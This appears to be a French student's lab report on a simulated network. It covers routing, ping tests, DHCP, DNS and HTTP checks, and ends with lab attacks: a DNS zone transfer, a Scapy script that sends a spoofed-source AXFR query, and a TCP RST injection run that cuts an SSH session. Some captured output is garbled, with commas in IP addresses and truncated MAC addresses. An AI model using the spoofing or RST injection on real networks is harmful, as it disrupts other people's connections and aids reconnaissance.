
### Partie 1

 **`ping` d'un client du `LAN1` vers un client du `LAN 2`**
```
PC1> show ip
NAME
: PC1[1]
IP/MASK : 10.3.1.1/24
GATEWAY : 10.3.1.254
DNS
MAC
00:50:79:66:68:00
LPORT : 20026
RHOST:PORT
127.0.0.1:20027
MTU : 1500

PC1> ping 10.3.2.2
84 bytes from 10.3.2.2 icmp_seq=1 ttl=62 time=41.389 ms
84 bytes from 10.3.2.2 icmp_seq=2 ttl=62 time=38,424 ms 84 bytes from 10.3.2.2 icmp_seq=3 ttl=62 time=33.709 ms
84 bytes from 10.3.2.2 icmp_seq=4 ttl=62 time=29.687 ms
84 bytes from 10.3.2.2 icmp_seq=5 ttl=62 time=23.024 ms
```


 **Afficher les adresses MAC des routeurs**
```
R2#show arp
Protocol Address Age (min) Hardware Addr Type Interface
Internet 10,3.12.1 24 c401.05da.0001 ARPA FastEthernet0/0
Internet 10.3.12.2  - c402.060a.0000 ARPA FastEthernet0/0
Internet 10.3.2.2   0  0050.7966.6802 ARPA FastEthernet1/0
Internet 10.3.2.1  17 050.7966.6803 ARPA FastEthernet1/0
Internet 10.3.2.254 - c402.060.0010 ARPA FastEthernet1/0
```

***

 **Prouvez que vous avez déjà un accès internet sur `r1`**
```
R1#ping 8,8,8,8
Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 8.8.8.8, timeout is 2 seconds:
Success rate is 100 percent (5/5), round-trip min/avg/max = 60/79/96 ms
```

 **Accès internet `LAN1`**
```
PC1> ping 8.8.8.8

184 bytes from 8.8.8.8 icmp_seq=1 ttl=59 time=39.400 ms
184 bytes from 8.8.8.8 icmp_seq=2 ttl=59 time=44.366 ms
184 bytes from 8.8.8.8 icmp_seq=3 ttl=59 time=39.093 ms
```

 **Accès internet `LAN2`**
```
PC3> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=57 time=47.942 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=57 time=45.632 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=57 time=52.843 ms
84 bytes from 1.1.1.1 icmp_seq=4 ttl=57 time=62.019 ms
```

### Partie 2

 **Tests de `ping`**
```
PC1> ping 10.3.1.2

84 bytes from 10.3.1.2 icmp_seq=1 ttl=64 time=2.778 ms
84 bytes from 10.3.1.2 icmp_seq=2 ttl=64 time=2.868 ms
84 bytes from 10.3.1.2 icmp_seq=3 ttl=64 time=3.087 ms
84 bytes from 10.3.1.2 icmp_seq=4 ttl=64 time=2.719 ms
84 bytes from 10.3.1.2 icmp_seq=5 ttl=64 time=2.738 ms
```

### B. Routeur
 **Tests de `ping`**
```
R1#ping 10.3.1.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.1.1, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 44/45/52 ms
R1#ping 10.3.2.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.2.1, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 32/40/48 ms
R1#ping 10.3.1.2

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.1.2, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 36/50/56 ms
```

```
PC1> sh ip

NAME        : PC1[1]
IP/MASK     : 10.3.1.1/24
GATEWAY     : 10.3.1.254
DNS         : 
MAC         : 00:50:79:66:68:00
LPORT       : 20018
RHOST:PORT  : 127.0.0.1:20019
MTU         : 1500

PC1> ping 10.3.2.1

84 bytes from 10.3.2.1 icmp_seq=1 ttl=63 time=15.255 ms
84 bytes from 10.3.2.1 icmp_seq=2 ttl=63 time=15.914 ms
84 bytes from 10.3.2.1 icmp_seq=3 ttl=63 time=20.622 ms
```

 **Tests de `ping`**
```
R1#ping 8.8.8.8

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 8.8.8.8, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 84/90/96 ms
```

```
PC1> ping 8.8.8.8

84 bytes from 8.8.8.8 icmp_seq=1 ttl=59 time=25.879 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=59 time=31.444 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=59 time=31.921 ms
84 bytes from 8.8.8.8 icmp_seq=4 ttl=59 time=25.661 ms
84 bytes from 8.8.8.8 icmp_seq=5 ttl=59 time=25.468 ms
```

```
PC2> ping 8.8.8.8        

84 bytes from 8.8.8.8 icmp_seq=1 ttl=59 time=30.584 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=59 time=30.328 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=59 time=27.446 ms
84 bytes from 8.8.8.8 icmp_seq=4 ttl=59 time=23.323 ms
84 bytes from 8.8.8.8 icmp_seq=5 ttl=59 time=27.337 ms
```
### Partie 3

 1. DHCP
 **Prouvez avec un VPCS**
```
PC4> dhcp
DORA IP 10.3.2.10/24 GW 10.3.2.254

PC4> sh ip      

NAME        : PC4[1]
IP/MASK     : 10.3.2.10/24
GATEWAY     : 10.3.2.254
DNS         : 1.1.1.1  
DHCP SERVER : 10.3.2.253
DHCP LEASE  : 43054, 43066/21533/37682
DOMAIN NAME : dns.tp2.b2
MAC         : 00:50:79:66:68:03
LPORT       : 20020
RHOST:PORT  : 127.0.0.1:20021
MTU         : 1500

PC4> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=59 time=20.809 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=59 time=19.477 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=59 time=17.022 ms
84 bytes from 1.1.1.1 icmp_seq=4 ttl=59 time=16.299 ms
84 bytes from 1.1.1.1 icmp_seq=5 ttl=59 time=20.685 ms
```

 2. DNS
 **Tests résolutions DNS**
```
PC4> dhcp
DORA IP 10.3.2.10/24 GW 10.3.2.254

PC4> sh ip

NAME        : PC4[1]
IP/MASK     : 10.3.2.10/24
GATEWAY     : 10.3.2.254
DNS         : 10.3.3.1  
DHCP SERVER : 10.3.2.253
DHCP LEASE  : 42680, 42689/21344/37352
DOMAIN NAME : dns.tp2.b2
MAC         : 00:50:79:66:68:03
LPORT       : 20025
RHOST:PORT  : 127.0.0.1:20026
MTU         : 1500

PC4> ping efrei.fr  
efrei.fr resolved to 51.255.68.208

84 bytes from 51.255.68.208 icmp_seq=1 ttl=59 time=43.690 ms
84 bytes from 51.255.68.208 icmp_seq=2 ttl=59 time=42.919 ms
84 bytes from 51.255.68.208 icmp_seq=3 ttl=59 time=44.278 ms
84 bytes from 51.255.68.208 icmp_seq=4 ttl=59 time=43.068 ms

PC4> ping dns.tp3.b2 
dns.tp3.b2 resolved to 10.3.3.1

84 bytes from 10.3.3.1 icmp_seq=1 ttl=63 time=18.995 ms
84 bytes from 10.3.3.1 icmp_seq=2 ttl=63 time=18.530 ms
84 bytes from 10.3.3.1 icmp_seq=3 ttl=63 time=17.155 ms
```



3. HTTP
 **Preuve avec un client**
```
root@localhost toto]# curl web.tp3.b2 | head
<!doctype html>
<head>
<meta name='viewport" content='width=device-width, initial-scale=1'>
<title>HTTP Server Test Page powered by: Rocky Linux</title>


[root@localhost toto]# curl supersite.tp3.b2 | head
<!doctype html>
<head>
<meta name='viewport" content='width=device-width, initial-scale=1'>
<title>HTTP Server Test Page powered by: Rocky Linux</title>
```

### Partie 4

1. DNS
 **Requêter l'enregistrement AXFR**
-> permet de récupérer tous les enregistrements DNS d'un domaine donné (pas très sécurisé si c'est activé)
```
[toto@localhost ~]$ dig axfr @dns.tp3.b2 tp3.b2

; <<>> DiG 9.16.23-RH <<>> axfr @dns.tp3.b2 tp3.b2
; (1 server found)
;; global options: +cmd
tp3.b2. 86400 IN SOA dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
tp3.b2. 86400 IN NS dns.tp3.b2. 
coolsite.tp3.b2. 86400 IN A 10.3.3.4 
dns.tp3.b2. 86400 IN A 10.3.3.1 
meow.tp3.b2. 86400 IN A 10.3.3.6 
prout.tp3.b2. 86400 IN A 10.3.3.5 
supersite.tp3.b2. 86400 IN A 10.3.3.3 
web.tp3.b2. 86400 IN A 10.3.3.2 
web2.tp3.b2. 86400 IN A 10.3.3.4 
web3.tp3.b2. 86400 IN A 10.3.3.5 
web4.tp3.b2. 86400 IN A 10.3.3.6 
tp3.b2. 86400 IN SOA dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
```

 **Spoof DNS query**
```
from scapy.all import *

answer = sr1(IP(dst="dns.tp3.b2", src="10.3.2.10")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="tp3.b2", qtype="AXFR")),verbose=0)

print(answer[DNS].summary()) # évidement on aura pas de réponse sur la machine attaquante
```


 2. TCP
 **Mettre en place une attaque TCP RST**
```
[attaquant@localhost toto]# python3 rst.py
ip src >> 10.3.3.1
ip dst >> 10.3.3.2
port src >> 56100
port dst >> 22
Seq nb >> 2819881537
Ack nb >> 3424035478
[ 3029.781295 ] device enp0s3 entered promiscuous mode
[ 3029.781295 ] device enp0s3 left promiscuous mode
```

```
[toto@localhost ~]$ aclient_loop: send disconnect: Broken pipe
```

